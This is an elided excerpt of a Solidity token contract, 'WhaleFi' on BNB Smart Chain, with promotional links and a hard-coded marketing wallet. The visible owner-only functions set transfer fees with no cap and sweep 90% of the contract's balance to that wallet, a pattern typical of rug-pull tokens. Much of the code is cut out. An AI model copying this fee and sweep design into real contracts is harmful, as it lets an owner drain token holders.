...
/*    WhaleFi
        Launch Binance Smart Chian 
            Telegram : https://t.me/whalefiBNB
            Website : https://whalefitoken.com/
*/
pragma solidity ^0.8;
interface IERC20 {
...
contract WHALEFI is Context, IERC20, Ownable {
    ...
    address payable public  _marketingWallet = payable (0xa349cB98b0B9b56e0efc1Ec636009b1778d09241);
    address payable public AddressToken = payable(address(this));
    ...
    string private constant _name = "WhaleFi";
    string private constant _symbol = "WHAFI";
    ...
    function setFeeMarketing(uint256 NEWFEE) external onlyOwner() {
        require(start + launch < block.timestamp);
        _marketingFee = NEWFEE;
    }

    function setFeeLiquidity(uint256 NEWFEE) external onlyOwner() {
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        emit Transfer (from, address(this), liquidityFee);
    ...
    function Launch() internal  virtual {
    ...
    function getFeeMarketing() external onlyOwner {
         uint256 Balance = balanceOf(address(this));
         uint256 sendTofee = Balance * 90 / 100;
        _basicTransfer(address(this),_marketingWallet, sendTofee);
    }
